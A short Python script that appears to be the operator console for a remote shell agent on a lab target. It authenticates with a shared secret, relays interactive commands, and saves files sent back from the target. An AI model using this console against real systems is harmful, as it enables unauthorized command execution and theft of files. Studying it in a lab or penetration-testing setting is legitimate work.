#!/usr/bin/env python3
import socket, os, sys, time

TARGET, PORT = "192.168.56.101", 5555
SECRET = "your_shared_secret"  # must match agent
LOGDIR = "logs"
os.makedirs(LOGDIR, exist_ok=True)

# Connect
s = socket.socket()
s.connect((TARGET, PORT))

# SSL placeholder
# s = ssl.wrap_socket(s, ca_certs="certs/ca.crt", cert_reqs=ssl.CERT_REQUIRED)

# Authenticate
prompt = s.recv(1024).decode()
if prompt.strip().endswith("Password:"):
    s.sendall((SECRET + "\n").encode())
    auth = s.recv(1024).decode()
    if auth.startswith("[!] Auth failed"): print(auth); sys.exit(1)
    print(auth, end="")
else:
    print("[!] Unexpected prompt:", prompt); sys.exit(1)

# Interactive loop
while True:
    data = s.recv(4096)
    if not data: break
    text = data.decode(errors='ignore')
    if text.startswith("FILE:"):
        # Parse header
        _, fname, size = text.strip().split(":")
        size = int(size)
        # Receive file bytes
        buf = b""
        while len(buf) < size:
            buf += s.recv(size - len(buf))
        path = os.path.join(LOGDIR, fname)
        with open(path, "wb") as f: f.write(buf)
        print(f"[+] Received file: {path}")
        continue
    # Regular output
    sys.stdout.write(text)
    cmd = input()
    s.sendall((cmd + "\n").encode())
    if cmd.strip() == "exit": break

s.close()